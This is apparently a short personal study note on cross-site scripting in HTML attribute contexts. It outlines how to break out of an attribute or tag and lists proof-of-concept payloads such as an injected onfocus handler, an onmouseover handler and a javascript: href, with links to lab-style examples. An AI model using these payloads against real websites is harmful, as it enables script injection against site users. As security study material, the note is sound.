if you can close (get out of):

1. both attribute and the tag --> [XSS out of tags](XSS out of tags)
2. the attribute --> use event handlers
3. neither attribute nor tag --> the attribute might be a vulnerable one, e.g.:
  - `<a href="{}"></a>`
  - `src` in `<iframe>`

EX:

- `<>` encoded --> add a new attribute that creates a scriptable context: `" autofocus onfocus=alert(document.domain) x="`
 with angle brackets encoded: `"onmouseover="alert(1)`
- [[XSS_examples#Stored XSS into anchor `href` attribute with double quotes HTML-encoded| `javascript:alert(1)`]]
- [[XSS_examples#Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped| into onclick event with <>" htmlencoded and ' escaped]]
- [[XSS_examples#angle brackets encoded| angle brackets encoded]]
- [[XSS_examples#Reflected XSS in canonical link tag| canonical link tag]]
